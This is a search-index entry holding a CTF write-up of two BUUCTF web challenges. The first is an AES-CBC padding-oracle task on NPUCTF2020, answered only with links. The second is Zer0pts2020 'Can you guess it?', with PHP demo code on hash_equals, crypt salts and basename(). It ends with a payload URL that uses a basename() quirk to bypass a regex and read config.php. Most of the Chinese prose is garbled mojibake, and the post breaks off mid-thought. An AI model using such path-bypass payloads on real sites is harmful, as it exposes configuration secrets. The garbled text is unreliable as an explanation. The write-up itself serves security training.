<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BuuctfDay9</title>
    <url>/yakko117/2022/01/03/buuctfDay09/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å¾ˆä¹…æ²¡æ›´æ–°äº†ï¼Œå› ä¸ºå„ç§åŸå› æ‘¸äº†ä¸€å¹´å¤šçš„é±¼</p>
<h1 id="NPUCTF2020-webğŸ•"><a href="#NPUCTF2020-webğŸ•" class="headerlink" title="[NPUCTF2020] webğŸ•"></a>[NPUCTF2020] webğŸ•</h1><p>é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹é¢˜ç›®</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//å®šä¹‰åŠ å¯†æ–¹å¼</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//å®šä¹‰å¯†é’¥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h2><ul>
<li>PHP AES åŠ å¯†</li>
<li>CBCå­—èŠ‚ç¿»è½¬æ”»å‡» <a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/" target="_blank" rel="noopener">å¾®ç¬‘å¸ˆå‚…çš„åˆ†æè®²è§£</a> ä»¥åŠ <a href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html" target="_blank" rel="noopener">wooyunçš„æŠ€æœ¯åˆ†æå¸–</a></li>
<li>è¿˜æœ‰è¿™ç¯‡ <a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">Padding Oracleæ”»å‡»çš„åˆ†æå’Œæ€è€ƒï¼ˆè¯¦ç»†ï¼‰</a></li>
</ul>
<p>ç¨‹åºæ˜¯ <code>128ä½çš„cbc</code>ï¼Œ<code>blocksizeæ˜¯16å­—èŠ‚</code>ï¼ŒåŠ å¯† <code>IV</code> å·²çŸ¥ï¼Œ<code>secret</code> æœªçŸ¥<br>ä½†æ˜¯å¯ä»¥çŸ¥é“è§£å¯†æ˜¯å¦æˆåŠŸï¼Œè€Œä¸”å¯ä»¥æ§åˆ¶å¯†æ–‡å’Œè§£å¯†çš„ <code>IV</code><br>å¯ä»¥ä½¿ç”¨ <code>padding oracle</code> çˆ†å‡ºæ˜æ–‡</p>
<p>ä¸»è¦åŸç†æ˜¯æ ¹æ® <code>cbc</code> åœ¨ <code>IV padding</code> æ­£ç¡®çš„æƒ…å†µä¸‹çš„è¿”å›å€¼å’Œ <code>padding</code> é”™è¯¯ä¸‹çš„è¿”å›å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§é€ä½è¿˜åŸå¯†æ–‡ã€‚</p>
<p>æ‰¾åˆ°ä¸ª<a href="https://github.com/mpgn/Padding-oracle-attack" target="_blank" rel="noopener">è„šæœ¬</a></p>
<p><a href="https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md" target="_blank" rel="noopener">https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md</a></p>
<p><a href="http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener">http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/</a></p>
<p><a href="https://www.jianshu.com/p/7f171477a603" target="_blank" rel="noopener">https://www.jianshu.com/p/7f171477a603</a></p>
<hr>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹"><a href="#ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹" class="headerlink" title="ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹"></a>ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹</h2><p><a href="https://www.php.net/manual/zh/function.hash-equals.php" target="_blank" rel="noopener">hash_equals å‡½æ•°</a><br><a href="https://www.php.net/manual/zh/function.crypt.php" target="_blank" rel="noopener">crypt åŠ å¯†å‡½æ•°</a></p>
<p>åœ¨å¯†ç å­¦ä¸­ï¼Œæ—¶åºæ”»å‡»æ˜¯ä¸€ç§ä¾§ä¿¡é“æ”»å‡»ï¼Œæ”»å‡»è€…è¯•å›¾é€šè¿‡åˆ†æåŠ å¯†ç®—æ³•çš„æ—¶é—´æ‰§è¡Œæ¥æ¨å¯¼å‡ºå¯†ç ã€‚æ¯ä¸€ä¸ªé€»è¾‘è¿ç®—åœ¨è®¡ç®—æœºéœ€è¦æ—¶é—´æ¥æ‰§è¡Œï¼Œæ ¹æ®è¾“å…¥ä¸åŒï¼Œç²¾ç¡®æµ‹é‡æ‰§è¡Œæ—¶é—´ï¼Œæ ¹æ®æ‰§è¡Œæ—¶é—´åæ¨å‡ºå¯†ç ã€‚</p>
<p>å¦‚æœæ˜¯ç”¨æ™®é€šçš„ <code>==</code> æ¥è¿›è¡Œæ¯”è¾ƒï¼Œé‚£ä¹ˆä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯ä»ç¬¬ä¸€ä½å¼€å§‹é€ä¸€è¿›è¡Œæ¯”è¾ƒçš„ï¼Œå‘ç°ä¸åŒå°±ç«‹å³è¿”å› <code>false</code>ï¼Œé‚£ä¹ˆé€šè¿‡è®¡ç®—è¿”å›çš„é€Ÿåº¦å°±çŸ¥é“äº†å¤§æ¦‚æ˜¯å“ªä¸€ä½å¼€å§‹ä¸åŒçš„ï¼Œ<code>php</code> ä¸­ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼Œå°±ä½¿ç”¨ <code>hash_equalså‡½æ•°</code>ã€‚</p>
<p>ç¤ºä¾‹å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test  = crypt(<span class="string">'114514'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line">$AAA   = crypt(<span class="string">'114514'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line">$BBB = crypt(<span class="string">'manako'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(hash_equals($test, $AAA));</span><br><span class="line">var_dump(hash_equals($test, $BBB));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å›æ˜¾</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure></div>

<p>è€Œå°†ç›å€¼ä¿®æ”¹ä¸ºè¦æ±‚çš„æ•£åˆ—ç±» <code>$2a$07$usesomesillystringforsalt$</code><br>æˆ–è€…å»æ‰boolå˜é‡å®šä¹‰ï¼Œç›´æ¥å°†ç›å€¼å˜æˆ <code>stringforsalt</code> è¿”å›ä¼šåˆ¤å®šä¸º <code>false</code></p>
<p>åŒæ—¶çœ‹åˆ°ä¸€å¥è¿™æ ·çš„è¯:</p>
<blockquote>
<p>When the failure string â€œ<em>0â€ is given as the salt, â€œ</em>1â€ will now be returned for consistency with other crypt implementations. Prior to this version, PHP 5.6 would incorrectly return a DES hash.</p>
</blockquote>
<p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåŠ å¯†ç®—æ³•<br><code>crypt</code> æœ‰ä¸¤ä¸ªå‚æ•°ï¼š<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šåŠ å¯†å­—ç¬¦ä¸²<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šç›å€¼å­—ç¬¦ä¸² <code>/$str = &#39;123456789&#39;</code>;<br>ä½¿ç”¨è‡ªåŠ¨ç›å€¼ <code>echo&#39;è‡ªåŠ¨ ç›å€¼: &#39; . crypt($str) . &quot;\n&quot;;</code><br>å¦‚ <code>$1$yvnZHBo0$sBZBd0vzZYnxbtQftQulZ</code></p>
<hr>
<h2 id="ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨-crypt"><a href="#ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨-crypt" class="headerlink" title="ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()"></a>ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()</h2><h3 id="CRYPT-STD-DES-åŸºäºæ ‡å‡†-DES-ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨"><a href="#CRYPT-STD-DES-åŸºäºæ ‡å‡†-DES-ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨" class="headerlink" title="CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨"></a>CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨</h3><p><code>./0-9A-Za-z</code> å­—ç¬¦ä¸­çš„ä¸¤ä¸ªå­—ç¬¦ä½œä¸ºç›å€¼ã€‚<br>åœ¨ç›å€¼ä¸­ä½¿ç”¨éæ³•çš„å­—ç¬¦å°†å¯¼è‡´ <code>crypt()</code> å¤±è´¥ã€‚</p>
<h3 id="CRYPT-EXT-DES-æ‰©å±•çš„åŸºäº-DES-ç®—æ³•çš„æ•£åˆ—ã€‚"><a href="#CRYPT-EXT-DES-æ‰©å±•çš„åŸºäº-DES-ç®—æ³•çš„æ•£åˆ—ã€‚" class="headerlink" title="CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚"></a>CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚</h3><p>å…¶ç›å€¼ä¸º <code>9</code> ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œç”± <code>1</code> ä¸ªä¸‹åˆ’çº¿åé¢è·Ÿç€ <code>4</code> å­—èŠ‚å¾ªç¯æ¬¡æ•°å’Œ <code>4</code> å­—èŠ‚ç›å€¼ç»„æˆã€‚<br>å®ƒä»¬è¢«ç¼–ç æˆå¯æ‰“å°å­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦ <code>6</code> ä½ï¼Œæœ‰æ•ˆä½æœ€å°‘çš„ä¼˜å…ˆã€‚<br><code>0</code> åˆ° <code>63</code> è¢«ç¼–ç ä¸º <code>./0-9A-Za-z</code>ã€‚</p>
<h3 id="CRYPT-MD5-MD5-æ•£åˆ—"><a href="#CRYPT-MD5-MD5-æ•£åˆ—" class="headerlink" title="CRYPT_MD5 - MD5 æ•£åˆ—"></a>CRYPT_MD5 - MD5 æ•£åˆ—</h3><p>ä½¿ç”¨ä¸€ä¸ªä»¥ <code>$1$</code> å¼€å§‹çš„ <code>12</code> å­—ç¬¦çš„å­—ç¬¦ä¸²ç›å€¼ã€‚</p>
<h3 id="CRYPT-BLOWFISH-Blowfish-ç®—æ³•"><a href="#CRYPT-BLOWFISH-Blowfish-ç®—æ³•" class="headerlink" title="CRYPT_BLOWFISH - Blowfish ç®—æ³•"></a>CRYPT_BLOWFISH - Blowfish ç®—æ³•</h3><p>ä½¿ç”¨å¦‚ä¸‹ç›å€¼ï¼š<code>$2a$</code>ï¼Œä¸€ä¸ªä¸¤ä½ <code>cost</code> å‚æ•°ï¼Œ<code>$</code> ä»¥åŠ <code>64</code> ä½ç”± <code>./0-9A-Za-z</code> ä¸­çš„å­—ç¬¦ç»„åˆè€Œæˆçš„å­—ç¬¦ä¸²ã€‚<br>åœ¨ç›å€¼ä¸­ä½¿ç”¨æ­¤èŒƒå›´ä¹‹å¤–çš„å­—ç¬¦å°†å¯¼è‡´ <code>crypt()</code> è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚<br>ä¸¤ä½ <code>cost</code> å‚æ•°æ˜¯å¾ªç¯æ¬¡æ•°ä»¥ <code>2</code> ä¸ºåº•çš„å¯¹æ•°ï¼Œå®ƒçš„èŒƒå›´æ˜¯ <code>04-31</code>ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´å°†å¯¼è‡´ <code>crypt()</code> å¤±è´¥ã€‚</p>
<p><font color="red">ï¼ï¼ï¼éœ€è¦æ³¨æ„åˆ°ä¸€ç‚¹</font>ï¼Œç›å€¼è¦æ±‚ä¸º <code>64ä½</code>ï¼Œé•¿åº¦ä¸æ»¡è¶³å°±ä¼šåŠ å¯†å¤±è´¥ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢çš„ç¤ºä¾‹ä½¿ç”¨<code>$2a$07$stringforsalt$</code> ä¼šå‡ºç° <code>hash</code> éªŒè¯ä¸º <code>true</code>;</p>
<h3 id="CRYPT-SHA256-SHA512-æ•£åˆ—ç®—æ³•"><a href="#CRYPT-SHA256-SHA512-æ•£åˆ—ç®—æ³•" class="headerlink" title="CRYPT_SHA256/SHA512 æ•£åˆ—ç®—æ³•"></a>CRYPT_SHA256/SHA512 æ•£åˆ—ç®—æ³•</h3><p><code>SHA-256</code> ç®—æ³•ä½¿ç”¨ä¸€ä¸ªä»¥ <code>$5$</code> å¼€å¤´çš„ <code>16</code> å­—ç¬¦å­—ç¬¦ä¸²ç›å€¼è¿›è¡Œæ•£åˆ—<br>å¦‚æœç›å€¼å­—ç¬¦ä¸²ä»¥ <code>rounds=$</code> å¼€å¤´ï¼Œ<code>N</code> çš„æ•°å­—å€¼å°†è¢«ç”¨æ¥æŒ‡å®šæ•£åˆ—å¾ªç¯çš„æ‰§è¡Œæ¬¡æ•°ï¼Œè¿™ç‚¹å¾ˆåƒ Blowfish ç®—æ³•çš„ <code>cost</code> å‚æ•°ã€‚é»˜è®¤çš„å¾ªç¯æ¬¡æ•°æ˜¯ <code>5000</code>ï¼Œæœ€å°æ˜¯ <code>1000</code>ï¼Œæœ€å¤§æ˜¯ <code>999,999,999</code>ã€‚è¶…å‡ºè¿™ä¸ªèŒƒå›´çš„ <code>N</code> å°†ä¼šè¢«è½¬æ¢ä¸ºæœ€æ¥è¿‘çš„å€¼ã€‚</p>
<p><code>SHA-256</code> å’Œ <code>SHA-512</code> åŒç†</p>
<p>åŠ å¯†ç¤ºä¾‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (CRYPT_STD_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Standard DES: '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'rl'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_EXT_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Extended DES: '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'_J9..rasm'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_MD5 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'MD5:          '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$1$rasmusle$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_BLOWFISH == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Blowfish:     '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$2a$07$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA256 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'SHA-256:      '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$5$rounds=5000$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA512 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'SHA-512:      '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$6$rounds=5000$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å›å½’åˆ°è§£é¢˜æœ¬èº«"><a href="#å›å½’åˆ°è§£é¢˜æœ¬èº«" class="headerlink" title="å›å½’åˆ°è§£é¢˜æœ¬èº«"></a>å›å½’åˆ°è§£é¢˜æœ¬èº«</h2><h3 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1"></a>æ€è·¯1</h3><p>æ¯”è¾ƒä¸¤ä¸ªæäº¤çš„å‚æ•°æ˜¯å¦ç›¸ç­‰ï¼Œåˆ™ç»™å‡ºflagï¼Œ<code>random_bytes</code>å‡½æ•°ç”Ÿæˆé€‚åˆäºåŠ å¯†ä½¿ç”¨çš„ä»»æ„é•¿åº¦çš„åŠ å¯†éšæœºå­—èŠ‚å­—ç¬¦ä¸²ï¼Œéšåé€šè¿‡<code>bin2hex</code>è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="comment">//éœ€è¦å°†PHP version æ›´æ”¹ä¸º&gt;=7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> (random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2"></a>æ€è·¯2</h3><p>ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼è®¿é—®å¼€å¤´æºç æç¤ºflagçš„config.php</p>
<p>éœ€è¦äº†è§£çš„å‡ ä¸ªä¸œè¥¿ <a href="https://www.php.net/basename" target="_blank" rel="noopener">basenameå‡½æ•°</a> ä»¥åŠ <a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">å‡½æ•°æ¼æ´</a><br><a href="https://blog.csdn.net/weixin_42314192/article/details/116257437" target="_blank" rel="noopener">å‚è€ƒæ€è·¯ï¼ŒPHPé‡Œçš„basenameå‡½æ•°ä¸æ”¯æŒä¸­æ–‡åçš„è§£å†³</a></p>
<p>é¦–å…ˆå…ˆçœ‹å…¨å±€å˜é‡ <code>$_SERVER[â€˜PHP_SELFâ€™]</code> </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SERVER[â€˜PHP_SELFâ€™] è·å–å½“å‰é¡µé¢åœ°å€</span><br><span class="line">æ˜¯å½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.test.com/php/ | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php?test=yakko | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php/test/yakko | /php/index.php/test/yakko</span></span><br><span class="line"></span><br><span class="line">$_SERVER[â€˜REQUEST_URIâ€™]å®Œæ•´urlåœ°å€ï¼ŒåŒ…æ‹¬è¯·æ±‚çš„urlå‚æ•°</span><br><span class="line"></span><br><span class="line">$_SERVER[â€˜HTTP_HOSTâ€™]åªæœ‰ä¸€æ®µçš„åŸŸå,ä¸åŒ…æ‹¬å‰é¢çš„åè®®å’Œåé¢çš„ç›¸å¯¹ä½ç½®</span><br></pre></td></tr></table></figure></div>

<p>è®¿é—® <code>/index.php/config.php</code>ï¼Œç»è¿‡ <code>basename()</code> ä¼ å…¥ <code>highlight_file()</code> çš„æ–‡ä»¶åå°±ä¼šå˜æˆ <code>config.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $url1 = <span class="string">"testpath/index.php"</span>;</span><br><span class="line">     <span class="comment">// è¿”å›index.php</span></span><br><span class="line">    </span><br><span class="line">    $url2 = <span class="string">"testpath/index.php"</span>.urldecode(<span class="string">'%D1%A7%CF'</span>); </span><br><span class="line">    <span class="comment">// è¿”å›index.phpå’Œä¹±ç </span></span><br><span class="line">    </span><br><span class="line">    $url3 = urldecode(<span class="string">'%D1%A7%CF%B0index.php+ '</span>);</span><br><span class="line">     <span class="comment">// è¿”å›flagï¼Œå‰é¢çš„éacsiiè¢«åˆ é™¤</span></span><br><span class="line">    </span><br><span class="line">    $url4 = urldecode(<span class="string">'index.php%D1%A7%CF%B0 '</span>); </span><br><span class="line">    <span class="comment">// è¿”å›flagå’Œåé¢çš„éascii</span></span><br><span class="line"><span class="keyword">echo</span> basename($url1) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url2) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url3) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url4) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>Payload1</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http://xxx.com/index.php/config.php/ä»»æ„ä¸­æ–‡?source</span></span><br></pre></td></tr></table></figure></div>

<p>ä»¥åŠå¤§ä½¬çš„fuzzæ€è·¯</p>
